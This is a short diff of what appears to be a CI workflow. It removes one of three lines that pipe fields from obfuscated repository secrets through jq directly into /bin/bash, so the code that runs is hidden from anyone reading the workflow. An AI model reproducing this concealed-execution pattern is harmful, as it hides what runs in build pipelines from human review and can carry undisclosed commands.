@@ -17,7 +17,6 @@ jobs:
           x50379: ${{ secrets.x50379 }}
         run: |
           printf '%s' "$x50379" | jq -r .uqjg30469 | /bin/bash
-          printf '%s' "$cngul38122" | jq -r .bf6482 | /bin/bash
           printf '%s' "$auuu0034" | jq -r .frd978 | /bin/bash
 
       - name: Save results
